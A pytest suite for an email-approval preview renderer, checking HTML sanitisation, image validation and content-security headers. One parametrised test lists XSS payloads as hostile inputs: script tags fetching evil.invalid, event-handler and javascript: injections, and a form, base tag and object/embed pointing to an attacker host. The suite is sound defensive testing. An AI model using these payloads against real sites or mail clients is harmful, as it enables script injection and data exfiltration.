import base64
import html
import json
from html.parser import HTMLParser

import pytest
from backend.approval_view import MAX_PAYLOAD, raster_data, render


PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a4XcAAAAASUVORK5CYII='


class Elements(HTMLParser):
    def __init__(self, text):
        super().__init__()
        self.tags = []
        self.feed(text)

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))


def test_plain_email_and_exact_json_are_both_available():
    payload = {'to': 'test@example.invalid', 'subject': 'A <new> chapter', 'body': 'Hello,\n\nA second paragraph.\n<script>untrusted()</script>', 'request_key': 'fixture'}
    page = render(json.dumps(payload).encode()).decode()
    assert 'aria-label="Formatted preview"' in page and 'aria-label="JSON"' in page
    assert 'A &lt;new&gt; chapter' in page and 'Hello,\n\nA second paragraph.' in page
    assert '<script>' not in page
    exact = page.split('<pre class="source"><code>', 1)[1].split('</code></pre>', 1)[0]
    assert json.loads(html.unescape(exact)) == payload


def test_graph_email_keeps_structure_and_embedded_image_without_external_requests():
    payload = {'message': {'subject': 'Invitation', 'toRecipients': [{'emailAddress': {'name': 'Guest', 'address': 'test@example.invalid'}}],
                          'body': {'contentType': 'HTML', 'content': '<h2>Welcome</h2><p>A <strong>bright</strong> beginning.</p><img src="cid:hero" alt="Invitation image"><img src="https://tracker.example.invalid/pixel" alt="External tracker">'},
                          'attachments': [{'isInline': True, 'contentId': 'hero', 'contentType': 'image/png', 'contentBytes': PNG}]}}
    page = render(json.dumps(payload).encode()).decode()
    tags = Elements(page).tags
    images = [attrs for tag, attrs in tags if tag == 'img']
    assert images == [{'src': 'data:image/png;base64,' + PNG, 'alt': 'Invitation image'}]
    assert '<h2>Welcome</h2>' in page and '<strong>bright</strong>' in page
    assert 'Guest &lt;test@example.invalid&gt;' in page and 'Image not loaded' in page


@pytest.mark.parametrize('hostile', [
    '<script>fetch("https://evil.invalid")</script><p onclick="alert(1)">Safe</p>',
    '<img src=x onerror=alert(1)><iframe src="http://127.0.0.1:8787"></iframe>',
    '<svg><a xlink:href="javascript:alert(1)">Bad</a></svg><math><mtext>Bad</mtext></math>',
    '<form action="https://evil.invalid"><input name="secret"></form><base href="https://evil.invalid">',
    '<a href="javascript:alert(1)" target="_top">Text</a><div style="background:url(https://evil.invalid)">Text</div>',
    '<p id="json" class="tabs"><img src="data:image/svg+xml;base64,PHN2Zz4=">Text</p>',
    '<textarea></textarea><object data="https://evil.invalid"><embed src="https://evil.invalid"></object>',
])
def test_untrusted_html_cannot_execute_navigate_or_fetch(hostile):
    page = render(json.dumps({'body': {'contentType': 'html', 'content': hostile}}).encode()).decode()
    tags = Elements(page).tags
    assert not any(tag in {'script', 'iframe', 'svg', 'math', 'form', 'base', 'object', 'embed', 'textarea', 'a'} for tag, _ in tags)
    for _, attrs in tags:
        assert not any(key.startswith('on') for key in attrs)
        assert not any(key in attrs for key in ('href', 'src', 'style', 'action'))
    assert len([1 for tag, _ in tags if tag == 'input']) == 2  # Only our view controls.


def test_embedded_image_requires_raster_signature_and_size_bound():
    assert raster_data('data:image/png;base64,' + PNG)
    assert raster_data('https://example.invalid/image.png') is None
    assert raster_data('data:image/png;base64,' + base64.b64encode(b'<svg>bad</svg>').decode()) is None
    assert raster_data('data:image/png;base64,!!!') is None
    assert raster_data('data:image/png;base64,' + 'A' * 700_001) is None
    with pytest.raises(ValueError, match='too large'):
        render(b' ' * (MAX_PAYLOAD + 1))


def test_generic_and_invalid_requests_remain_inspectable():
    assert 'no email body' in render(b'{"operation":"update","value":1}').decode()
    assert 'original request' in render(b'not valid json').decode()


@pytest.mark.asyncio
async def test_request_preview_origin_only_runs_the_trusted_activity_bridge(monkeypatch):
    import hashlib
    import httpx
    import time
    import backend.preview as module
    from backend.preview_bridge import BRIDGE
    target={'kind':'document','name':'Request details','content':b'{"body":"hello"}', 'media_type':'application/json','expires':time.time()+60}
    monkeypatch.setattr(module,'targets',{45678:target})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=module.app),base_url='http://127.0.0.1:45678') as client:
        response=await client.get('/')
    assert response.status_code==200 and 'Formatted preview' in response.text
    policy=response.headers['content-security-policy']
    scripts=policy.split('script-src ',1)[1].split(';',1)[0]
    digest=base64.b64encode(hashlib.sha256(BRIDGE[8:-9]).digest()).decode()
    assert scripts=="'sha256-"+digest+"'"
    assert "connect-src 'none'" in policy and 'img-src data:;' in policy
    assert response.headers['referrer-policy']=='no-referrer'
